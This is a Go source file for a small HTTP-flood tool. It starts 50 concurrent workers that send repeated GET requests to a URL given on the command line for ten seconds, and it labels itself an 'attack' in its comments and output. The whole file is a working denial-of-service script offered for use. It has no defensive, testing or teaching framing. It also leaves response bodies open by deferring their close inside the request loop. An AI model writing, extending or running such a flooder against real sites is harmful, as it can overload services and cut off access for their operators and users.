package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Give all the required arguments!")
		os.Exit(1)
	}

	targetURL := os.Args[1]

	attackDuration := 10 * time.Second // Set the duration of the attack

	// Number of concurrent workers
	numWorkers := 50

	// Channel to signal when the attack is finished
	done := make(chan struct{})

	// Launch concurrent workers
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackTarget(targetURL, done)
		}()
	}

	// Run the attack for the specified duration
	go func() {
		time.Sleep(attackDuration)
		close(done)
	}()

	// Wait for all workers to finish
	wg.Wait()
	fmt.Println("Attack finished")
}

func attackTarget(targetURL string, done <-chan struct{}) {
	client := http.Client{}
	for {
		select {
		case <-done:
			return
		default:
			req, err := http.NewRequest("GET", targetURL, nil)
			if err != nil {
				fmt.Println("Error creating request:", err)
				return
			}
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Error sending request:", err)
				return
			}
			defer resp.Body.Close()
			fmt.Println("Request sent")
		}
	}
}
